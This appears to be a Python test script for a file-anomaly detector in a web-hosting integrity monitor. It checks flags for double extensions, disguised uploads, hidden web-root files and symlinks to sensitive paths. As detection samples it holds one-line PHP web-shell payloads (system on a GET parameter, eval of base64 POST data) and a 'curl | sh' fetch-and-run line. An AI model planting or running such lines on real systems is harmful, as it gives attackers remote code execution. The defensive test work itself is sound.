import asyncio
import os
import resource
import sys
import tempfile
import time

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from core.file_anomaly_signals import (
    SIGNAL_DOUBLE_EXTENSION, SIGNAL_EXECUTABLE_IN_UPLOAD_DIR,
    SIGNAL_EXTENSION_CONTENT_MISMATCH, SIGNAL_HIDDEN_FILE_IN_WEB_ROOT,
    SIGNAL_SCRIPT_IN_UPLOAD_DIR, SIGNAL_SYMLINK_ESCAPES_PROJECT,
    SIGNAL_SYMLINK_TO_SENSITIVE_PATH, analyze_file_anomalies, read_header_bytes,
)

_PROJECT = "/home/site/htdocs/example.com"
_WEB = f"{_PROJECT}/public"
_UPLOADS = f"{_PROJECT}/public/uploads"

_BENIGN_PHP = b"<?php\nrequire __DIR__ . '/bootstrap.php';\necho render_home();\n"
_BENIGN_JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01" + b"\x00" * 200


def cpu_seconds():
    usage = resource.getrusage(resource.RUSAGE_SELF)
    return usage.ru_utime + usage.ru_stime


def analyze(path, **kwargs):
    kwargs.setdefault("change_type", "created")
    kwargs.setdefault("project_root", _PROJECT)
    return analyze_file_anomalies(path, **kwargs)


async def main() -> None:
    report = analyze(f"{_WEB}/index.php", header=_BENIGN_PHP)
    assert not report, (
        f"a normal PHP entry point must produce no anomaly signal, got {report.names}"
    )
    report = analyze(f"{_PROJECT}/src/UserService.php", header=_BENIGN_PHP)
    assert not report, f"ordinary application source must stay silent, got {report.names}"
    report = analyze(f"{_UPLOADS}/photo.jpg", header=_BENIGN_JPEG)
    assert not report, f"a real image in an upload directory must stay silent, got {report.names}"
    report = analyze(f"{_PROJECT}/node_modules/lib/index.js", header=b"module.exports = {};")
    assert not report, f"dependency tree files must stay silent, got {report.names}"
    print(
        "Test 1 [NO FALSE POSITIVE ON NORMAL FILES] (index.php, application source, a real JPEG in "
        "uploads and a node_modules file all produce zero signals) PASSED"
    )

    report = analyze(f"{_UPLOADS}/invoice.pdf.php", header=_BENIGN_PHP)
    assert SIGNAL_DOUBLE_EXTENSION in report.names, (
        f"'invoice.pdf.php' hides a script behind a document extension, got {report.names}"
    )
    report = analyze(f"{_UPLOADS}/shell.php.jpg", header=_BENIGN_PHP)
    assert SIGNAL_DOUBLE_EXTENSION in report.names, (
        f"'shell.php.jpg' hides a .php behind an image extension, got {report.names}"
    )
    for benign in ("archive.tar.gz", "jquery.min.js", "app.config.json", "styles.min.css"):
        benign_report = analyze(f"{_PROJECT}/{benign}")
        assert SIGNAL_DOUBLE_EXTENSION not in benign_report.names, (
            f"'{benign}' is an ordinary multi-dot filename and must not be flagged, got "
            f"{benign_report.names}"
        )
    print(
        "Test 2 [DOUBLE EXTENSION] (invoice.pdf.php and shell.php.jpg are flagged; "
        "archive.tar.gz, jquery.min.js, app.config.json and styles.min.css are not) PASSED"
    )

    php_in_jpg = analyze(f"{_UPLOADS}/avatar.jpg", header=b"GIF89a\n<?php system($_GET['c']); ?>")
    assert SIGNAL_EXTENSION_CONTENT_MISMATCH in php_in_jpg.names, (
        f"a .jpg whose bytes contain PHP must be flagged, got {php_in_jpg.names}"
    )
    shebang = analyze(f"{_UPLOADS}/notes.txt", header=b"#!/bin/bash\ncurl http://example.invalid | sh\n")
    assert SIGNAL_EXTENSION_CONTENT_MISMATCH in shebang.names, (
        f"a .txt starting with a shebang must be flagged, got {shebang.names}"
    )
    elf = analyze(f"{_UPLOADS}/report.pdf", header=b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)
    assert SIGNAL_EXTENSION_CONTENT_MISMATCH in elf.names, (
        f"a .pdf that is actually an ELF binary must be flagged, got {elf.names}"
    )
    real_image = analyze(f"{_UPLOADS}/photo.png", header=b"\x89PNG\r\n\x1a\n" + b"\x00" * 64)
    assert SIGNAL_EXTENSION_CONTENT_MISMATCH not in real_image.names, (
        f"a genuine PNG must not be flagged, got {real_image.names}"
    )
    php_file = analyze(f"{_PROJECT}/src/Controller.php", header=_BENIGN_PHP)
    assert SIGNAL_EXTENSION_CONTENT_MISMATCH not in php_file.names, (
        "PHP content in a .php file is correct, not a mismatch"
    )
    print(
        "Test 3 [EXTENSION CONTENT MISMATCH] (PHP bytes in .jpg, a shebang in .txt and an ELF in "
        ".pdf are flagged; a genuine PNG and PHP-in-.php are not -- only the direction that matters "
        "for compromise is reported) PASSED"
    )

    hidden = analyze(f"{_WEB}/.shell.php", header=_BENIGN_PHP)
    assert SIGNAL_HIDDEN_FILE_IN_WEB_ROOT in hidden.names, (
        f"a hidden file in the web root must be flagged, got {hidden.names}"
    )
    for allowed in (".htaccess", ".well-known", ".user.ini", ".gitignore"):
        allowed_report = analyze(f"{_WEB}/{allowed}")
        assert SIGNAL_HIDDEN_FILE_IN_WEB_ROOT not in allowed_report.names, (
            f"'{allowed}' is a legitimate hidden web file and must not be flagged"
        )
    for env_name in (".env", ".env.example", ".env.production"):
        env_report = analyze(f"{_PROJECT}/{env_name}")
        assert SIGNAL_HIDDEN_FILE_IN_WEB_ROOT not in env_report.names, (
            f"'{env_name}' already has dedicated secret-config handling in the FIM pipeline; "
            f"flagging it here as well would double-report the same file"
        )
    outside = analyze("/home/site/logs/.rotate-state")
    assert SIGNAL_HIDDEN_FILE_IN_WEB_ROOT not in outside.names, (
        "hidden files outside web-reachable areas are ordinary and must not be flagged"
    )
    print(
        "Test 4 [HIDDEN FILE] (.shell.php in the web root is flagged; .htaccess, .well-known, "
        ".user.ini, .gitignore, every .env* variant and a hidden file outside the web root are "
        "not) PASSED"
    )

    escaping = analyze(
        f"{_WEB}/backup", is_symlink=True, symlink_target="/etc/passwd",
    )
    assert SIGNAL_SYMLINK_TO_SENSITIVE_PATH in escaping.names, (
        f"a symlink into /etc must be flagged, got {escaping.names}"
    )
    assert SIGNAL_SYMLINK_ESCAPES_PROJECT in escaping.names, (
        f"a symlink leaving the project root must be flagged, got {escaping.names}"
    )
    internal = analyze(
        f"{_WEB}/assets", is_symlink=True, symlink_target=f"{_PROJECT}/storage/assets",
    )
    assert not internal.names, (
        f"a symlink that stays inside the project is normal deployment practice, got "
        f"{internal.names}"
    )
    relative = analyze(
        f"{_WEB}/shared", is_symlink=True, symlink_target="../storage/shared",
    )
    assert not relative.names, (
        f"a relative symlink resolving inside the project must not be flagged, got {relative.names}"
    )
    print(
        "Test 5 [SYMLINK ANOMALY] (a web-root symlink to /etc/passwd raises both "
        "SYMLINK_TO_SENSITIVE_PATH and SYMLINK_ESCAPES_PROJECT; absolute and relative symlinks that "
        "stay inside the project raise nothing) PASSED"
    )

    script_upload = analyze(f"{_UPLOADS}/cmd.php", header=_BENIGN_PHP)
    assert SIGNAL_SCRIPT_IN_UPLOAD_DIR in script_upload.names, (
        f"a .php inside an upload directory must be flagged, got {script_upload.names}"
    )
    exec_upload = analyze(f"{_UPLOADS}/tool.bin", is_executable=True, header=b"\x00" * 32)
    assert SIGNAL_EXECUTABLE_IN_UPLOAD_DIR in exec_upload.names, (
        f"an executable bit inside an upload directory must be flagged, got {exec_upload.names}"
    )
    script_outside = analyze(f"{_PROJECT}/bin/deploy.sh", is_executable=True, header=b"#!/bin/sh\n")
    assert SIGNAL_SCRIPT_IN_UPLOAD_DIR not in script_outside.names, (
        "an executable script outside upload directories is normal and must not raise this signal"
    )
    print(
        "Test 6 [SCRIPT AND EXECUTABLE IN UPLOAD DIR] (cmd.php and an executable binary under "
        "uploads/ are flagged; an executable deploy script in bin/ is not) PASSED"
    )

    combined = analyze(
        f"{_UPLOADS}/.avatar.jpg.php", is_executable=True,
        header=b"GIF89a\n<?php eval(base64_decode($_POST['x'])); ?>",
    )
    assert len(combined.signals) >= 3, (
        f"a file combining several suspicious characteristics must accumulate signals, got "
        f"{combined.names}"
    )
    single = analyze(f"{_UPLOADS}/photo.jpg", header=_BENIGN_JPEG)
    assert combined.score > single.score, "combined evidence must score above a benign file"
    assert single.score == 0
    print(
        f"Test 7 [EVIDENCE ACCUMULATION] (a hidden double-extension script with mismatched content "
        f"in an upload directory accumulates {len(combined.signals)} signals scoring "
        f"{combined.score}, while a benign upload scores {single.score} -- no single indicator is "
        f"treated as proof) PASSED"
    )

    deleted = analyze(f"{_UPLOADS}/shell.php.jpg", change_type="deleted", header=_BENIGN_PHP)
    assert not deleted, (
        f"a deletion has no content to analyse and must produce no content signal, got "
        f"{deleted.names}"
    )
    print("Test 8 [DELETION] (a deleted file produces no content-based signal) PASSED")

    with tempfile.TemporaryDirectory(prefix="rtsa-anomaly-") as workdir:
        big = os.path.join(workdir, "large.jpg")
        with open(big, "wb") as handle:
            handle.write(b"\xff\xd8\xff\xe0" + os.urandom(8_000_000))
        header = read_header_bytes(big)
        assert header is not None and len(header) <= 512, (
            f"the header read must be bounded, got {len(header) if header else 0} bytes"
        )
        missing = read_header_bytes(os.path.join(workdir, "does-not-exist"))
        assert missing is None, "a missing file must return None rather than raising"
    print(
        "Test 9 [BOUNDED READ] (an 8 MB file is inspected by reading at most 512 bytes, and a "
        "missing path returns None instead of raising -- the signal layer never hashes or walks) "
        "PASSED"
    )

    paths = [f"{_UPLOADS}/file{i}.jpg" for i in range(2000)]
    start_cpu, start_wall = cpu_seconds(), time.monotonic()
    for path in paths:
        analyze(path, header=_BENIGN_JPEG)
    elapsed = max(time.monotonic() - start_wall, 1e-9)
    used = cpu_seconds() - start_cpu
    per_file_us = used / len(paths) * 1_000_000
    assert per_file_us < 500, (
        f"per-file analysis must stay far below the cost of hashing, measured {per_file_us:.1f}us"
    )
    print(
        f"Test 10 [ANALYSIS COST] ({len(paths)} files analysed in {elapsed:.3f}s using {used:.3f}s "
        f"CPU = {per_file_us:.1f}us per file, pure in-memory string work with no syscall per "
        f"signal) PASSED"
    )

    print("\nALL FOLDER ANOMALY SIGNAL TESTS PASSED")


asyncio.run(main())
